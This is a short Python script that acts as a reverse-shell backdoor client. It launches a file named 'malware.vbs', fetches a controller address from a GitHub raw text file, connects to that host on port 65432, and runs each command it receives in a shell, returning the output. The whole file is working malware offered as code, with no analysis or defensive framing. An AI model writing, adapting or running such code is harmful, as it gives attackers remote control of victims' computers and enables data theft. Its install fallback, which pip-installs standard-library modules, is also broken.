try:  
    import socket
    import subprocess
    import requests
    import os
except:
    import os
    os.system('pip install socket subprocess requests')
vbs_script = "malware.vbs"


def client():
    link = "https://raw.githubusercontent.com/80dropz/communication/refs/heads/main/ipv4.txt"
    data = requests.get(link)
    hostip = data.text.strip() 
    port = 65432
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((hostip, port))
            break
        except:
            print("not found")
            pass
    print(f"Connected to server at {hostip}:{port}")
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            print("Closing connection.")
            break
        print(f"Command received: {command}")
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.sendall(result)
        except subprocess.CalledProcessError as e:
            client_socket.sendall(f"Error executing command: {e.output}".encode())
    client_socket.close()

if __name__ == "__main__":
    subprocess.run(["cscript", vbs_script], shell=True)
    client()

